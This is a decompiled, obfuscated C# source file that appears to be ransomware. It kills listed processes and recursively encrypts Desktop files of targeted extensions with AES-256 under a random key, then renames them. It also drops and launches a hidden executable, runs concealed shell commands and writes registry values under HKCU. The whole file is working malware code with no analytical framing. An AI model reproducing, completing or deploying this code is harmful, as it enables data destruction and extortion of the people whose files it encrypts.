using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using _003CPrivateImplementationDetails_003E_007B53EE5BDF_002DC925_002D45D0_002DBB4F_002D1DE255E331E5_007D;
using Launcher.CS;
using Microsoft.Win32;

namespace ns0;

internal class Class8
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class9
	{
		public static readonly Class9 class9_0 = new Class9();

		public static Func<byte[], IEnumerable<byte>> func_0;

		internal IEnumerable<byte> method_0(byte[] byte_0)
		{
			return byte_0;
		}
	}

	private static readonly string string_0 = Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_366(), Class7.byte_4, Class7.byte_3);

	private static readonly string string_1 = Environment.UserName;

	public static void smethod_0()
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_7();
		processStartInfo.RedirectStandardInput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		process.StartInfo = processStartInfo;
		process.Start();
		using StreamWriter streamWriter = process.StandardInput;
		if (streamWriter.BaseStream.CanWrite)
		{
			streamWriter.WriteLine(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_343());
			streamWriter.WriteLine(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_344());
			streamWriter.WriteLine(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_345());
			streamWriter.WriteLine(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_346());
			streamWriter.WriteLine(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_347());
			streamWriter.WriteLine(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_348());
			streamWriter.WriteLine(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_349());
			streamWriter.WriteLine(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_350());
			streamWriter.WriteLine(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_351());
		}
	}

	public static void smethod_1()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_352(), Class7.byte_4, Class7.byte_3), writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_353(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_13(), RegistryValueKind.String);
			registryKey.Close();
		}
		RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_354(), Class7.byte_4, Class7.byte_3), writable: true);
		if (registryKey2 != null)
		{
			registryKey2.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_355(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_13(), RegistryValueKind.String);
			registryKey2.Close();
		}
		RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_356(), Class7.byte_4, Class7.byte_3), writable: true);
		if (registryKey3 != null)
		{
			registryKey3.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_357(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_10(), RegistryValueKind.String);
			registryKey3.Close();
		}
		RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey(Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_356(), Class7.byte_4, Class7.byte_3), writable: true);
		if (registryKey4 != null)
		{
			registryKey4.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_10(), RegistryValueKind.String);
			registryKey4.Close();
		}
		RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey(Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_356(), Class7.byte_4, Class7.byte_3), writable: true);
		if (registryKey5 != null)
		{
			registryKey5.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_358(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_10(), RegistryValueKind.String);
			registryKey5.Close();
		}
		RegistryKey registryKey6 = Registry.CurrentUser.OpenSubKey(Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_359(), Class7.byte_4, Class7.byte_3), writable: true);
		if (registryKey6 != null)
		{
			registryKey6.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_10(), RegistryValueKind.String);
			registryKey6.Close();
		}
		RegistryKey registryKey7 = Registry.CurrentUser.OpenSubKey(Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_359(), Class7.byte_4, Class7.byte_3), writable: true);
		if (registryKey7 != null)
		{
			registryKey7.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_360(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_10(), RegistryValueKind.String);
			registryKey7.Close();
		}
		RegistryKey registryKey8 = Registry.CurrentUser.OpenSubKey(Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_354(), Class7.byte_4, Class7.byte_3), writable: true);
		if (registryKey8 != null)
		{
			registryKey8.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_361(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_13(), RegistryValueKind.String);
			registryKey8.Close();
		}
	}

	public static void smethod_2()
	{
		smethod_3();
		Class7.string_2 = smethod_5(64);
		if (!string.IsNullOrEmpty(Class7.string_5))
		{
			smethod_7(Class7.string_5);
			return;
		}
		string[] array = new string[1] { Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) };
		string[] array2 = array;
		foreach (string string_ in array2)
		{
			smethod_7(string_);
		}
		Class5.Class6.smethod_0(Class7.string_4, Class5.Class6.Enum0.const_2);
		Class5.smethod_0();
		string text = string_0 + string_1 + F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_362();
		File.WriteAllBytes(text, Class0.smethod_0());
		File.SetAttributes(text, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.Archive);
		Process.Start(text);
		try
		{
			string path = string_0 + string_1 + F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_363();
			File.WriteAllBytes(path, Class0.smethod_1());
			File.SetAttributes(path, FileAttributes.ReadOnly | FileAttributes.Archive);
		}
		catch
		{
		}
	}

	private static bool smethod_3()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			string[] string_ = Class7.string_7;
			for (int i = 0; i < processes.Length; i++)
			{
				for (int j = 0; j < string_.Length; j++)
				{
					if (processes[i].ProcessName == string_[j])
					{
						processes[i].Kill();
					}
				}
			}
		}
		catch (Exception ex)
		{
			if (ex.Data != null)
			{
				return false;
			}
		}
		return true;
	}

	private static byte[] smethod_4(byte[] byte_0, byte[] byte_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[15];
		rNGCryptoServiceProvider.GetBytes(array);
		byte[] array2 = null;
		byte[] array3 = null;
		List<byte[]> list = new List<byte[]>();
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.GenerateIV();
			byte[] array4 = array;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, array4, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			array2 = memoryStream.ToArray();
			list.Add(array2);
			list.Add(rijndaelManaged.IV);
			list.Add(array4);
		}
		return list.SelectMany((byte[] byte_0) => byte_0).ToArray();
	}

	private static string smethod_5(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_0--)
		{
			stringBuilder.Append(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_364()[random.Next(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_364().Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void smethod_6(string string_2)
	{
		Class7.byte_0 = File.ReadAllBytes(string_2);
		Class7.byte_1 = Encoding.UTF8.GetBytes(Class7.string_2);
		try
		{
			try
			{
				if (Class7.executionMode_0 == ExecutionMode.Full)
				{
					byte[] bytes = smethod_4(File.ReadAllBytes(string_2), Class7.byte_1);
					File.WriteAllBytes(string_2, bytes);
					File.Move(string_2, string_2 + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_365(), Class7.byte_4, Class7.byte_3));
					Class7.list_0.Add(string_2);
					return;
				}
				if (new FileInfo(string_2).Length <= 4096L)
				{
					byte[] bytes2 = smethod_4(File.ReadAllBytes(string_2), Class7.byte_1);
					File.WriteAllBytes(string_2, bytes2);
					File.Move(string_2, string_2 + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_365(), Class7.byte_4, Class7.byte_3));
					Class7.list_0.Add(string_2);
					return;
				}
				byte[] array = new byte[8192];
				using (BinaryReader binaryReader = new BinaryReader(File.Open(string_2, FileMode.Open)))
				{
					byte[] array2 = smethod_4(binaryReader.ReadBytes(4096), Class7.byte_1);
					Array.Copy(array2, array, array2.Length);
				}
				using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(string_2, FileMode.Open)))
				{
					binaryWriter.Write(array);
				}
				File.Move(string_2, string_2 + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_365(), Class7.byte_4, Class7.byte_3));
				Class7.list_0.Add(string_2);
			}
			catch (Exception)
			{
				FileAttributes attributes = File.GetAttributes(string_2);
				if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
				{
					attributes = smethod_8(attributes, FileAttributes.ReadOnly);
					File.SetAttributes(string_2, attributes);
				}
				if (Class7.executionMode_0 == ExecutionMode.Full)
				{
					byte[] bytes3 = smethod_4(File.ReadAllBytes(string_2), Class7.byte_1);
					File.WriteAllBytes(string_2, bytes3);
					File.Move(string_2, string_2 + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_365(), Class7.byte_4, Class7.byte_3));
					Class7.list_0.Add(string_2);
					return;
				}
				if (new FileInfo(string_2).Length <= 4096L)
				{
					byte[] bytes4 = smethod_4(File.ReadAllBytes(string_2), Class7.byte_1);
					File.WriteAllBytes(string_2, bytes4);
					File.Move(string_2, string_2 + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_365(), Class7.byte_4, Class7.byte_3));
					Class7.list_0.Add(string_2);
					return;
				}
				byte[] buffer = new byte[8192];
				using (BinaryReader binaryReader2 = new BinaryReader(File.Open(string_2, FileMode.Open)))
				{
					buffer = smethod_4(binaryReader2.ReadBytes(4096), Class7.byte_1);
				}
				using (BinaryWriter binaryWriter2 = new BinaryWriter(File.Open(string_2, FileMode.Open)))
				{
					binaryWriter2.Write(buffer);
				}
				File.Move(string_2, string_2 + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_365(), Class7.byte_4, Class7.byte_3));
				Class7.list_0.Add(string_2);
			}
		}
		catch
		{
		}
	}

	private static void smethod_7(string string_2)
	{
		try
		{
			string[] files = Directory.GetFiles(string_2);
			string[] directories = Directory.GetDirectories(string_2);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (Class7.string_6.Contains(extension.ToLower()))
				{
					smethod_6(files[i]);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				smethod_7(directories[j]);
			}
		}
		catch
		{
		}
	}

	private static FileAttributes smethod_8(FileAttributes fileAttributes_0, FileAttributes fileAttributes_1)
	{
		return fileAttributes_0 & ~fileAttributes_1;
	}
}
